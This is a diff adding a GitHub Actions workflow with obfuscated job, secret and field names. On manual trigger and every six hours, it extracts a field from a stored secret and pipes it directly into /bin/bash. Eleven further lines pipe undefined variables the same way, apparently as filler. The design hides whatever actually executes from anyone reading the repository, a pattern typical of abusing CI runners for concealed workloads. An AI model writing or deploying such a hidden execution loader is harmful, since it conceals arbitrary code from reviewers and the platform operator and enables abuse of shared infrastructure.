@@ -1,0 +1,29 @@
+name: tianzhongze9348
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '41 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: tianzhongze9348
+        env:
+          aef43494: ${{ secrets.aef43494 }}
+        run: |
+          echo $aef43494 | jq -r .kqbpl3059 | /bin/bash
+          echo $ilc91508 | jq -r .arb651 | /bin/bash
+          echo $bhhn80 | jq -r .y426 | /bin/bash
+          echo $ftlz673 | jq -r .dnrh4 | /bin/bash
+          echo $dkerm64139 | jq -r .zm71 | /bin/bash
+          echo $zm629 | jq -r .dmof9072 | /bin/bash
+          echo $vali3 | jq -r .yepa326 | /bin/bash
+          echo $vzvg1 | jq -r .o036 | /bin/bash
+          echo $rrpq5289 | jq -r .hf04547 | /bin/bash
+          echo $vxqrz4962 | jq -r .eqa6424 | /bin/bash
+          echo $setp980 | jq -r .kayd268 | /bin/bash
+          echo $szs88 | jq -r .uirvj510 | /bin/bash
+
